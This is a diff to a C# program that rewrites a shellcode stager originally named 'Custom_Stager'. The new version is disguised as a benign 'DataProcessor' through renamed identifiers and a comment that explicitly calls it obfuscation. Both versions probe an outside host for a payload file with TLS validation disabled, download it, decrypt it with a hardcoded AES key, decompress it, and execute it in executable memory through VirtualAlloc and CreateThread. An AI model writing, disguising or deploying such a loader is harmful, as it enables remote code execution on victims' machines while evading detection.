@@ -1,180 +1,146 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.IO.Compression;
 using System.Linq;
 using System.Net;
-using System.Runtime.InteropServices;
-using System.Security.Cryptography;
 using System.Text;
+using System.IO.Compression;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 
-namespace Custom_Stager
+namespace DataProcessor
 {
-    class Program
+    class CoreLogic
     {
-        private static string baseUrl = "https://www.tecnologico.org/d2fc1b6a458f";
-        private static string AESKey = "9ae0c8e048d89fb3";
-        private static string AESIV = "789ca1a73299c6e0";
+        private static string resourcePath = "https://www.tecnologico.org/d2fc1b6a458f";
+        private static string securityToken = "9ae0c8e048d89fb3";
+        private static string initVector = "789ca1a73299c6e0";
 
-        private static List<string> extensions = new List<string>
+        private static List<string> fileTypes = new List<string>
         {
             ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
             ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
             ".axd", ".asx", ".asmx", ".ashx", ".swf"
         };
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-        private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV)
+        // Obfuscated memory and thread management
+        private static class ResourceManager
         {
-            byte[] key = Encoding.UTF8.GetBytes(AESKey);
-            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+            [DllImport("kernel32.dll", EntryPoint = "VirtualAlloc", SetLastError = true, ExactSpelling = true)]
+            private static extern IntPtr AllocateMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-            using (Aes aesAlg = Aes.Create())
+            [DllImport("kernel32.dll", EntryPoint = "CreateThread", SetLastError = true)]
+            private static extern IntPtr StartRoutine(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+            [DllImport("kernel32.dll", EntryPoint = "WaitForSingleObject", SetLastError = true)]
+            private static extern uint WaitForCompletion(IntPtr hHandle, uint dwMilliseconds);
+
+            public static void ProcessData(byte[] data)
             {
-                aesAlg.Key = key;
-                aesAlg.IV = IV;
-                aesAlg.Padding = PaddingMode.None;
+                if (data.Length <= 16) return;
 
-                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+                byte[] payload = data.Skip(16).ToArray();
+                byte[] processed = SecureTransform(payload);
+                byte[] expanded = ExpandData(processed);
 
-                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
-                using (MemoryStream decryptedStream = new MemoryStream())
-                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
+                IntPtr mem = AllocateMemory(IntPtr.Zero, (uint)expanded.Length, 0x3000, 0x40);
+                if (mem == IntPtr.Zero) return;
+
+                Marshal.Copy(expanded, 0, mem, expanded.Length);
+                IntPtr threadHandle = StartRoutine(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+                WaitForCompletion(threadHandle, 0xFFFFFFFF);
+            }
+        }
+
+        private static byte[] SecureTransform(byte[] input)
+        {
+            byte[] key = Encoding.UTF8.GetBytes(securityToken);
+            byte[] iv = Encoding.UTF8.GetBytes(initVector);
+
+            using (Aes cipher = Aes.Create())
+            {
+                cipher.Key = key;
+                cipher.IV = iv;
+                cipher.Padding = PaddingMode.None;
+
+                ICryptoTransform transformer = cipher.CreateDecryptor(cipher.Key, cipher.IV);
+                using (MemoryStream inputStream = new MemoryStream(input))
+                using (MemoryStream outputStream = new MemoryStream())
+                using (CryptoStream cryptoStream = new CryptoStream(inputStream, transformer, CryptoStreamMode.Read))
                 {
-                    cryptoStream.CopyTo(decryptedStream);
-                    return decryptedStream.ToArray();
+                    cryptoStream.CopyTo(outputStream);
+                    return outputStream.ToArray();
                 }
             }
         }
 
-        public static byte[] Decompress(byte[] input)
+        private static byte[] ExpandData(byte[] input)
         {
-            using (MemoryStream tmpMs = new MemoryStream())
-            using (MemoryStream ms = new MemoryStream(input))
-            using (GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true))
+            using (MemoryStream outputStream = new MemoryStream())
+            using (MemoryStream inputStream = new MemoryStream(input))
+            using (GZipStream expander = new GZipStream(inputStream, CompressionMode.Decompress, true))
             {
-                zip.CopyTo(tmpMs);
-                return tmpMs.ToArray();
+                expander.CopyTo(outputStream);
+                return outputStream.ToArray();
             }
         }
 
-        public static byte[] Download(string url)
+        private static byte[] FetchResource(string url)
         {
             try
             {
-                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
-                WebClient client = new WebClient();
-                return client.DownloadData(url);
+                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errors) => true;
+                using (WebClient client = new WebClient())
+                {
+                    return client.DownloadData(url);
+                }
             }
-            catch (Exception ex)
+            catch
             {
-                //Console.WriteLine("Error during download: " + ex.Message);
                 return null;
             }
         }
 
-        public static void Execute(byte[] code)
+        private static string LocateResource()
         {
-            if (code.Length <= 16)
+            foreach (var type in fileTypes)
             {
-                //Console.WriteLine("The code length is insufficient.");
-                return;
-            }
-
-            byte[] encrypted = code.Skip(16).ToArray();
-            byte[] decrypted;
-            try
-            {
-                decrypted = AESDecrypt(encrypted, AESKey, AESIV);
-            }
-            catch
-            {
-                //Console.WriteLine("Error during decryption.");
-                return;
-            }
-
-            byte[] decompressed;
-            try
-            {
-                decompressed = Decompress(decrypted);
-            }
-            catch
-            {
-                //Console.WriteLine("Error during decompression.");
-                return;
-            }
-
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
-            if (addr == IntPtr.Zero)
-            {
-                //Console.WriteLine("Error during memory allocation.");
-                return;
-            }
-
-            Marshal.Copy(decompressed, 0, addr, decompressed.Length);
-            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }
-
-        public static string CheckUrlExistence()
-        {
-            foreach (var ext in extensions)
-            {
-                string fullUrl = baseUrl + ext;
-
+                string target = resourcePath + type;
                 try
                 {
-                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(fullUrl);
-                    request.Method = "GET";
-                    using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(target);
+                    req.Method = "GET";
+                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                     {
-                        if (response.StatusCode == HttpStatusCode.OK)
+                        if (resp.StatusCode == HttpStatusCode.OK)
                         {
-                            //Console.WriteLine($"Found valid URL: {fullUrl}");
-                            return fullUrl; // Return the valid URL
+                            return target;
                         }
                     }
                 }
-                catch (WebException ex)
+                catch
                 {
-                    // Handle specific errors or continue checking other extensions
-                    //Console.WriteLine($"Error checking {fullUrl}: {ex.Message}");
-                    continue; // Ignore errors and continue checking other extensions
+                    continue;
                 }
-
             }
-
-            //Console.WriteLine("No valid file found with specified extensions.");
-            return null; // Return null if no valid URL is found
+            return null;
         }
 
-        public static void Main(String[] args)
+        private static void ProcessResource(string resourceUrl)
         {
-            // First check for a valid URL with the correct extension
-            string validUrl = CheckUrlExistence();
-
-            if (!string.IsNullOrEmpty(validUrl))
+            byte[] resourceData = FetchResource(resourceUrl);
+            if (resourceData != null && resourceData.Length > 0)
             {
-                // Proceed with downloading and executing the payload from the valid URL
-                byte[] output = Download(validUrl);
+                ResourceManager.ProcessData(resourceData);
+            }
+        }
 
-                if (output != null && output.Length > 0)
-                {
-                    Execute(output);
-                }
-                else
-                {
-                    //Console.WriteLine("Error retrieving payload.");
-                }
-
+        public static void Main(string[] args)
+        {
+            string validResource = LocateResource();
+            if (!string.IsNullOrEmpty(validResource))
+            {
+                ProcessResource(validResource);
             }
         }
     }
